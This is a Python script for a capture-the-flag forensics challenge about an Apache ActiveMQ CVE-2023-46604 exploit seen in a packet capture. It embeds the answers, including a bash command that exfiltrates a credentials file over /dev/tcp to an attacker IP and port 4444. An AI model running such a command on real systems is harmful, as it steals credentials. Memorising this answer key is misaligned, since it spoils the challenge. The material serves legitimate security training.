#!/usr/bin/env python3

import hashlib
import os
import re
import sys


FLAG = open("flag.txt").read().strip()


def norm(s: str) -> str:
    """Lower, strip, collapse internal whitespace."""
    return re.sub(r"\s+", " ", s.strip().lower())


def check_exact(expected):
    """Case-insensitive exact match against any of the accepted answers."""
    accepted = {norm(e) for e in expected}

    def _check(answer: str) -> bool:
        return norm(answer) in accepted

    return _check


def check_hex_sha256(expected_hex: str):
    """Lowercase hex compare; tolerates player pasting uppercase or with 0x."""
    want = expected_hex.strip().lower().removeprefix("0x")

    def _check(answer: str) -> bool:
        got = answer.strip().lower().removeprefix("0x")
        return got == want

    return _check


def check_cvss(expected_str: str):
    """CVSS score -- accept '10' or '10.0' style."""
    try:
        want = float(expected_str)
    except ValueError:
        want = None

    def _check(answer: str) -> bool:
        try:
            return abs(float(answer.strip()) - want) < 1e-6
        except (ValueError, TypeError):
            return False

    return _check



QUESTIONS = [
    (
        "What is the CVE identifier of the exploited vulnerability?",
        "example format: CVE-YYYY-NNNNN",
        check_exact(["CVE-2023-46604"]),
    ),
    (
        "What is the CVSS v3.1 Base Score of that CVE?",
        "one decimal, e.g. 7.5",
        check_cvss("10.0"),
    ),
    (
        "What is the vulnerable Apache product (full product name)?",
        "example format: Apache <product>",
        check_exact(["Apache ActiveMQ", "ActiveMQ"]),
    ),
    (
        "What is the name of the messaging protocol abused by the exploit frame?",
        "one word",
        check_exact(["OpenWire"]),
    ),
    (
        "What is the default TCP port of that protocol?",
        "integer",
        check_exact(["61616"]),
    ),
    (
        "What is the ActiveMQ broker version string present in the capture?",
        "example format: X.Y.Z",
        check_exact(["5.15.9"]),
    ),
    (
        "What is the attacker's IPv4 address?",
        "example format: a.b.c.d",
        check_exact(["10.133.7.37"]),
    ),
    (
        "What is the broker's (victim's) IPv4 address?",
        "example format: a.b.c.d",
        check_exact(["10.133.7.50"]),
    ),
    (
        "What is the fully-qualified Java class name coerced during deserialization?",
        "example format: a.b.c.ClassName",
        check_exact([
            "org.springframework.context.support.ClassPathXmlApplicationContext",
        ]),
    ),
    (
        "What is the full HTTP URL argument given to that class's constructor?",
        "example format: http://host:port/path",
        check_exact(["http://10.133.7.37:8000/poc.xml"]),
    ),
    (
        "What is the SHA-256 of the XML file fetched by the broker? (lowercase hex)",
        "64 hex chars",
        check_hex_sha256(
            "87ab1de5a0dc6d435402864e8c81ed1e3dbb82106dac6cc7cf8d4a67133bcead",
        ),
    ),
    (
        "What Java class is instantiated by the Spring bean inside that XML?",
        "example format: a.b.c.ClassName",
        check_exact(["java.lang.ProcessBuilder"]),
    ),
    (
        "What is the shell binary chosen by the bean (first list element)?",
        "one word",
        check_exact(["bash"]),
    ),
    (
        "What is the full command string executed by the broker (third list element)?",
        "copy it verbatim; leading/trailing whitespace is ignored",
        check_exact([
            "cat /opt/activemq/conf/credentials.properties > /dev/tcp/10.133.7.37/4444",
        ]),
    ),
    (
        "What TCP destination port received the exfiltrated bytes?",
        "integer",
        check_exact(["4444"]),
    ),
    (
        "What is the absolute path of the file the broker exfiltrated?",
        "example format: /path/to/file",
        check_exact(["/opt/activemq/conf/credentials.properties"]),
    ),
    (
        "What is the SHA-256 of the exfiltrated payload bytes? (lowercase hex)",
        "64 hex chars",
        check_hex_sha256(
            "d2f896d8678ce2e994f848fba8bda496e40c327b45122e98a170beff2b73a7a5",
        ),
    ),
    (
        "What is the api.token value inside the exfiltrated file?",
        "copy the right-hand side of 'api.token='",
        check_exact(["HG9-7f2b4c1e-9d8a-5f6b-3e2a-1c4d5f6a7b8c"]),
    ),
]



BANNER = r"""
==============================================================================
                            Packet Treachery 
==============================================================================

""".strip()


def main() -> None:
    print(BANNER, flush=True)

    for idx, (question, hint, check) in enumerate(QUESTIONS, start=1):
        while True:
            print(f"\n[Q{idx:02d}/{len(QUESTIONS)}] {question}", flush=True)
            print(f"      ({hint})", flush=True)
            print("Answer> ", end="", flush=True)
            try:
                answer = sys.stdin.readline()
            except KeyboardInterrupt:
                return
            if answer == "":  # EOF
                return
            answer = answer.rstrip("\r\n")
            if check(answer):
                print(f"[+] Q{idx:02d} correct.", flush=True)
                break
            print("[-] Incorrect. Try again.", flush=True)

    print("\n[+] All 18 questions answered.", flush=True)
    print(f"[+] FLAG: {FLAG}", flush=True)


if __name__ == "__main__":
    main()
